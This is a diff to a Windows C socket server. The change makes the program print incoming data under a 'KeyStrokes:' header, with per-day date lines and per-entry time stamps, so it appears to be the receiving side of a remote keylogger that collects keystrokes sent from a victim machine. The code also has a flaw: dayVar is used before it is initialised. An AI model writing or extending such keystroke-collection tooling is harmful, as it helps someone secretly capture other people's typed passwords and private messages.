@@ -2,8 +2,8 @@
 #include <winsock2.h>
 #include <unistd.h>
 
-#define MSG_BUFF_LEN 256
-
+#define MSG_BUFF_LEN 5
+#define ENTER 13
 BOOL checkIfArrChanged(char newMsgBuff[MSG_BUFF_LEN], char prevMsgBuff[MSG_BUFF_LEN]) {
     int itrIdx;
     if (strlen(newMsgBuff) > strlen(prevMsgBuff)) return TRUE;  // added a new character
@@ -28,6 +28,8 @@ void moveCursorToStartOfLine() {
 }
 
 int main() {
+    SetConsoleOutputCP(CP_UTF8);
+
     WSADATA wsa;
     WSAStartup(MAKEWORD(2, 2), &wsa);
 
@@ -53,32 +55,23 @@ int main() {
     GetLocalTime(&st);
 
     char newMsgBuff[MSG_BUFF_LEN];
-    char prevMsgBuff[MSG_BUFF_LEN];
+    printf("KeyStrokes: \n");
 
-    int clock = 0;
+    WORD dayVar;
 
     while (1) {
         int recievedMsg = recv(client_socket, newMsgBuff, sizeof(newMsgBuff) - 1, 0);
         if (recievedMsg > 0) {
             newMsgBuff[recievedMsg] = '\0';
-            if (checkIfArrChanged(newMsgBuff, prevMsgBuff) == TRUE) {
-                deleteLine();
-                printf("Recieved: %s", newMsgBuff);
-                moveCursorToStartOfLine();
-                clock = 0;
-            } else {
-                clock++;
-                // printf("Clock: %d\n", clock);
+            SYSTEMTIME st;
+            GetLocalTime(&st);
+
+            if (dayVar != st.wDay) {
+                dayVar = st.wDay;
+                printf("[%02d/%02d/%02d]\n", st.wMonth, st.wDay, st.wYear);
             }
-            if (clock > 100) {            
-                SYSTEMTIME st;
-                GetLocalTime(&st);
-                deleteLine();
-                printf("%02d/%02d/%04d - %02d:%02d:%02d", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond);
-                moveCursorToStartOfLine();
-            }
-            prevMsgBuff[0] = '\0'; // reset
-            strcpy(prevMsgBuff, newMsgBuff);
+            printf("  |  [%02d:%02d:%02d, ", st.wHour, st.wMinute, st.wSecond);
+            printf("%s ]\n", newMsgBuff);
         }
     }
     return 0;
